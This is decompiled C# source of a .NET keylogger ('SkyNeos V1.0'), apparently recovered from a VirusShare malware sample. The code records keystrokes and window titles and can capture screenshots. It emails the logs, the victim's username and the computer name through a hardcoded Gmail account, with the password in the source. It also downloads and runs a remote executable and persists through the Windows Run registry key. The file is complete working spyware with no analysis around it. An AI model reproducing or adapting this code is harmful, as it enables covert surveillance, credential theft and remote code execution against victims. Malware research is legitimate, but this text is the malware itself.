// Decompiled with JetBrains decompiler
// Type: LEThjJw
// Assembly: java, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4F52145B-C1A7-459C-A2DE-CBB30B6015C6
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Spy.MSIL.KeyLogger.cve-9472961f0eb1b1eabf0fa24a446a9649c2ef21221933f756389470464205e723.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

[StandardModule]
internal sealed class LEThjJw
{
  public static Mutex jUOghDD;
  public static string YNXdLBf = "JFKrvS";
  [AccessedThroughProperty("EuNPwTu")]
  private static DKZdzRzsT _EuNPwTu;
  public static string uGhrjxj;
  public static string VBchppI;
  public static string cvKkIsa;
  public static string TynXgGx;
  public static Thread hXIIvyR;
  public static string LXDeEXv;
  public static Process PQWnzcg;
  [AccessedThroughProperty("rfBtxzm")]
  private static System.Windows.Forms.Timer _rfBtxzm;
  private const int aPnzoLC = 7;
  private const int EyJcnQs = 1;
  private const int kyYpCyb = 0;
  public static string GoYVfC;
  public static string uNIYXT;
  public static string btclKj;
  public static int fStbJf;
  public static int TJnXhPZhz;
  public static LEThjJw.SyEvtnLQc wjNJTYgQG;
  public static string xcWgTs;
  public static bool STCWkA;
  public static bool xakvoU;
  public static bool yZuOZd;
  public static string geDJGkbRG;
  public static string VNYEUyahw;
  public static string ovERJrctj;
  public static string YWYkXJTbH;
  public static int ptfJVlPGe;
  public static bool GmsYXVOwO;

  static LEThjJw()
  {
    LEThjJw.EuNPwTu = new DKZdzRzsT();
    LEThjJw.cvKkIsa = "GxBArV";
    LEThjJw.TynXgGx = "zWJrYn.exe";
    LEThjJw.rfBtxzm = new System.Windows.Forms.Timer();
    LEThjJw.GoYVfC = "wimbrol604@gmail.com";
    LEThjJw.uNIYXT = "vissemaar1";
    LEThjJw.btclKj = "smtp.gmail.com";
    LEThjJw.fStbJf = 587;
    LEThjJw.TJnXhPZhz = 1;
    LEThjJw.wjNJTYgQG = LEThjJw.SyEvtnLQc.TJTOFvGKL;
    LEThjJw.xcWgTs = "";
    LEThjJw.STCWkA = false;
    LEThjJw.xakvoU = false;
    LEThjJw.yZuOZd = false;
    LEThjJw.geDJGkbRG = "";
    LEThjJw.VNYEUyahw = "";
    LEThjJw.ovERJrctj = "Title";
    LEThjJw.YWYkXJTbH = "Message";
    LEThjJw.ptfJVlPGe = 0;
    LEThjJw.GmsYXVOwO = false;
  }

  public static DKZdzRzsT EuNPwTu
  {
    get => LEThjJw._EuNPwTu;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      DKZdzRzsT.ofcThDZWxwfpEventHandler wxwfpEventHandler = new DKZdzRzsT.ofcThDZWxwfpEventHandler(LEThjJw.oWBRXO);
      if (LEThjJw._EuNPwTu != null)
        DKZdzRzsT.ofcThDZWxwfp -= wxwfpEventHandler;
      LEThjJw._EuNPwTu = value;
      if (LEThjJw._EuNPwTu == null)
        return;
      DKZdzRzsT.ofcThDZWxwfp += wxwfpEventHandler;
    }
  }

  public static System.Windows.Forms.Timer rfBtxzm
  {
    get => LEThjJw._rfBtxzm;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(LEThjJw.odkGrW);
      if (LEThjJw._rfBtxzm != null)
        LEThjJw._rfBtxzm.Tick -= eventHandler;
      LEThjJw._rfBtxzm = value;
      if (LEThjJw._rfBtxzm == null)
        return;
      LEThjJw._rfBtxzm.Tick += eventHandler;
    }
  }

  [DllImport("kernel32.dll", EntryPoint = "GetConsoleWindow", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern IntPtr omgIEoC();

  [DllImport("user32.dll", EntryPoint = "ShowWindow", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int OQxuJnJ(IntPtr YDwstuk, int iwEOEDy);

  [DllImport("user32.dll", EntryPoint = "GetForegroundWindow", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int gAJgPgy();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int ekGjdmf(int YDwstuk, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lrmsAY, int JCkEyI);

  private static string cVuCUl()
  {
    string lrmsAY = new string(char.MinValue, 100);
    LEThjJw.ekGjdmf(LEThjJw.gAJgPgy(), ref lrmsAY, 100);
    return lrmsAY.Substring(0, checked (Strings.InStr(lrmsAY, "\0") - 1));
  }

  public static void lECEcS(string DPKNlQ, string vLavEF)
  {
    RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    subKey.SetValue(DPKNlQ, (object) vLavEF);
  }

  public static void PZzjho(string DPKNlQ)
  {
    RegistryKey subKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
    subKey.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
    subKey.DeleteValue(DPKNlQ, false);
  }

  public static void EdTzAm(string aPJUJp)
  {
    try
    {
      Mutex.OpenExisting(aPJUJp);
      ProjectData.EndApp();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      LEThjJw.jUOghDD = new Mutex(false, aPJUJp);
      ProjectData.ClearProjectError();
    }
  }

  public static string xniupr(int KERdnJ, int JcXJyI)
  {
    Random random = new Random();
    string str1 = (string) null;
    string str2 = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPLKHJJGFDSAZXCVBNM";
    int num1 = random.Next(checked (KERdnJ + 1), JcXJyI);
    int num2 = 1;
    while (num2 <= num1)
    {
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (str2.Length - 2) * VBMath.Rnd()) + 1f)));
      str1 += Conversions.ToString(str2[index]);
      checked { ++num2; }
    }
    return str1;
  }

  private static void oWBRXO(string bLtJLQ)
  {
    if (Operators.CompareString(LEThjJw.VBchppI, LEThjJw.cVuCUl(), false) != 0)
    {
      LEThjJw.uGhrjxj = LEThjJw.uGhrjxj + "\r\n[TITLE: " + LEThjJw.cVuCUl() + "]:\r\n";
      LEThjJw.VBchppI = LEThjJw.cVuCUl();
      Console.WriteLine("\r\n[TITLE: " + LEThjJw.cVuCUl() + "]:");
    }
    LEThjJw.uGhrjxj += bLtJLQ;
    Console.Write(bLtJLQ);
  }

  private static void odkGrW(object JGkBFP, EventArgs XAviVG)
  {
    Console.WriteLine("A new log is sending...");
    new Thread((ParameterizedThreadStart) (a0 => LEThjJw.cuhISQ(Conversions.ToString(a0))))
    {
      IsBackground = true
    }.Start((object) LEThjJw.uGhrjxj);
    LEThjJw.uGhrjxj = "";
  }

  private static void cuhISQ(string aZxkJd)
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      string str = Path.GetTempPath() + "\\" + LEThjJw.xniupr(5, 10) + ".png";
label_2:
      num3 = 3;
      if (!LEThjJw.STCWkA)
        goto label_7;
label_3:
      num3 = 4;
      eGKfVnKcdYRn.VrSyKgXrYQA();
label_4:
      num3 = 5;
      if (!System.IO.File.Exists(str))
        goto label_6;
label_5:
      num3 = 6;
      System.IO.File.Delete(str);
label_6:
      num3 = 8;
      eGKfVnKcdYRn.drXQPtwVsZb.Save(str, ImageFormat.Png);
label_7:
      num3 = 10;
      MailMessage message = new MailMessage();
label_8:
      num3 = 11;
      SmtpClient smtpClient1 = new SmtpClient(LEThjJw.btclKj);
label_9:
      num3 = 12;
      SmtpClient smtpClient2 = smtpClient1;
label_10:
      num3 = 13;
      smtpClient2.EnableSsl = true;
label_11:
      num3 = 14;
      smtpClient2.Credentials = (ICredentialsByHost) new NetworkCredential(LEThjJw.GoYVfC, LEThjJw.uNIYXT);
label_12:
      num3 = 15;
      smtpClient2.Port = LEThjJw.fStbJf;
label_13:
      smtpClient2 = (SmtpClient) null;
label_14:
      num3 = 17;
      MailMessage mailMessage = message;
label_15:
      num3 = 18;
      mailMessage.To.Add(LEThjJw.GoYVfC);
label_16:
      num3 = 19;
      mailMessage.From = new MailAddress(LEThjJw.GoYVfC);
label_17:
      num3 = 20;
      mailMessage.Subject = LEThjJw.xcWgTs;
label_18:
      num3 = 21;
      mailMessage.Body = aZxkJd;
label_19:
      num3 = 22;
      if (!LEThjJw.STCWkA)
        goto label_21;
label_20:
      num3 = 23;
      mailMessage.Attachments.Add(new Attachment(str));
label_21:
      num3 = 25;
      if (!LEThjJw.yZuOZd)
        goto label_23;
label_22:
      num3 = 26;
      mailMessage.Body = "Victim Username: " + LEThjJw.VSbQJD().ToString() + "\r\n" + mailMessage.Body;
label_23:
      num3 = 28;
      if (!LEThjJw.xakvoU)
        goto label_25;
label_24:
      num3 = 29;
      mailMessage.Body = "Victim Computer Name: " + MyProject.Computer.Name + "\r\n" + mailMessage.Body;
label_25:
      mailMessage = (MailMessage) null;
label_26:
      num3 = 32;
      smtpClient1.Send(message);
label_27:
      num3 = 33;
      Console.WriteLine("##### Logs have been sent! #####");
      goto label_34;
label_29:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
            case 8:
              goto label_6;
            case 9:
            case 10:
              goto label_7;
            case 11:
              goto label_8;
            case 12:
              goto label_9;
            case 13:
              goto label_10;
            case 14:
              goto label_11;
            case 15:
              goto label_12;
            case 16:
              goto label_13;
            case 17:
              goto label_14;
            case 18:
              goto label_15;
            case 19:
              goto label_16;
            case 20:
              goto label_17;
            case 21:
              goto label_18;
            case 22:
              goto label_19;
            case 23:
              goto label_20;
            case 24:
            case 25:
              goto label_21;
            case 26:
              goto label_22;
            case 27:
            case 28:
              goto label_23;
            case 29:
              goto label_24;
            case 30:
            case 31:
              goto label_25;
            case 32:
              goto label_26;
            case 33:
              goto label_27;
            case 34:
              goto label_34;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_29;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_34:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private static void usLQaN()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      WebClient webClient = new WebClient();
label_2:
      num3 = 3;
      Uri address = new Uri(LEThjJw.geDJGkbRG);
label_3:
      num3 = 4;
      LEThjJw.LXDeEXv = Path.GetTempPath() + "\\" + LEThjJw.xniupr(5, 10) + ".exe";
label_4:
      num3 = 5;
      webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(LEThjJw.RsszTlWvT);
label_5:
      num3 = 6;
      webClient.DownloadFileAsync(address, LEThjJw.LXDeEXv);
      goto label_12;
label_7:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_12;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_7;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_12:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private static void RsszTlWvT(object JGkBFP, AsyncCompletedEventArgs XAviVG)
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      Process process = new Process();
label_2:
      num3 = 3;
      ProcessStartInfo processStartInfo = process.StartInfo;
label_3:
      num3 = 4;
      processStartInfo.FileName = LEThjJw.LXDeEXv;
label_4:
      num3 = 5;
      processStartInfo.UseShellExecute = true;
label_5:
      processStartInfo = (ProcessStartInfo) null;
label_6:
      num3 = 7;
      process.Start();
      goto label_13;
label_8:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num4 = num2 + 1;
          num2 = 0;
          switch (num4)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
              goto label_13;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_8;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_13:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  private static string VSbQJD()
  {
    string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
    string str = folderPath.Remove(folderPath.LastIndexOf("\\"));
    return str.Substring(checked (str.LastIndexOf("\\") + 1));
  }

  [STAThread]
  public static void Main()
  {
label_0:
    int num1;
    int num2;
    try
    {
      ProjectData.ClearProjectError();
      num1 = 1;
label_1:
      int num3 = 2;
      LEThjJw.EdTzAm(LEThjJw.YNXdLBf);
label_2:
      num3 = 3;
      System.Windows.Forms.Timer timer = LEThjJw.rfBtxzm;
label_3:
      num3 = 4;
      timer.Interval = checked (LEThjJw.TJnXhPZhz * int.Parse(Conversions.ToString(unchecked ((int) LEThjJw.wjNJTYgQG))));
label_4:
      num3 = 5;
      timer.Start();
label_5:
      timer = (System.Windows.Forms.Timer) null;
label_6:
      num3 = 7;
      LEThjJw.hXIIvyR = new Thread(new ThreadStart(LEThjJw.usLQaN));
label_7:
      num3 = 8;
      Thread thread = LEThjJw.hXIIvyR;
label_8:
      num3 = 9;
      thread.IsBackground = true;
label_9:
      num3 = 10;
      thread.Start();
label_10:
      thread = (Thread) null;
label_11:
      num3 = 12;
      LEThjJw.PQWnzcg = new Process();
label_12:
      num3 = 13;
      Process process = LEThjJw.PQWnzcg;
label_13:
      num3 = 14;
      process.StartInfo.FileName = LEThjJw.VNYEUyahw;
label_14:
      num3 = 15;
      process.StartInfo.UseShellExecute = true;
label_15:
      num3 = 16;
      process.Start();
label_16:
      process = (Process) null;
label_17:
      num3 = 18;
      if (!LEThjJw.GmsYXVOwO)
        goto label_19;
label_18:
      num3 = 19;
      int num4 = (int) Interaction.MsgBox((object) LEThjJw.YWYkXJTbH, (MsgBoxStyle) LEThjJw.ptfJVlPGe, (object) LEThjJw.ovERJrctj);
label_19:
      num3 = 21;
      Console.WriteLine("SkyNeos V1.0 Keylogger Engine Started Successfully!");
label_20:
      num3 = 22;
      string str = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
label_21:
      num3 = 23;
      MyProject.Computer.FileSystem.CreateDirectory(str + "\\" + LEThjJw.cvKkIsa);
label_22:
      num3 = 24;
      str = str + "\\" + LEThjJw.cvKkIsa + "\\" + LEThjJw.TynXgGx;
label_23:
      num3 = 25;
      MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, str, true);
label_24:
      num3 = 26;
      LEThjJw.lECEcS(LEThjJw.cvKkIsa, str);
label_25:
      num3 = 27;
      LEThjJw.EuNPwTu.gpQlWcgtIzEA();
label_26:
      num3 = 28;
      Application.Run();
      goto label_33;
label_28:
      num2 = num3;
      switch (num1)
      {
        case 1:
          int num5 = num2 + 1;
          num2 = 0;
          switch (num5)
          {
            case 1:
              goto label_0;
            case 2:
              goto label_1;
            case 3:
              goto label_2;
            case 4:
              goto label_3;
            case 5:
              goto label_4;
            case 6:
              goto label_5;
            case 7:
              goto label_6;
            case 8:
              goto label_7;
            case 9:
              goto label_8;
            case 10:
              goto label_9;
            case 11:
              goto label_10;
            case 12:
              goto label_11;
            case 13:
              goto label_12;
            case 14:
              goto label_13;
            case 15:
              goto label_14;
            case 16:
              goto label_15;
            case 17:
              goto label_16;
            case 18:
              goto label_17;
            case 19:
              goto label_18;
            case 20:
            case 21:
              goto label_19;
            case 22:
              goto label_20;
            case 23:
              goto label_21;
            case 24:
              goto label_22;
            case 25:
              goto label_23;
            case 26:
              goto label_24;
            case 27:
              goto label_25;
            case 28:
              goto label_26;
            case 29:
              goto label_33;
          }
          break;
      }
    }
    catch (Exception ex) when (ex is Exception & num1 != 0 & num2 == 0)
    {
      ProjectData.SetProjectError(ex);
      goto label_28;
    }
    throw ProjectData.CreateProjectError(-2146828237);
label_33:
    if (num2 == 0)
      return;
    ProjectData.ClearProjectError();
  }

  public enum SyEvtnLQc
  {
    BwVthTFrr = 1,
    RkvWHnktc = 1000, // 0x000003E8
    TJTOFvGKL = 60000, // 0x0000EA60
    HaJtfVFda = 3600000, // 0x0036EE80
  }
}
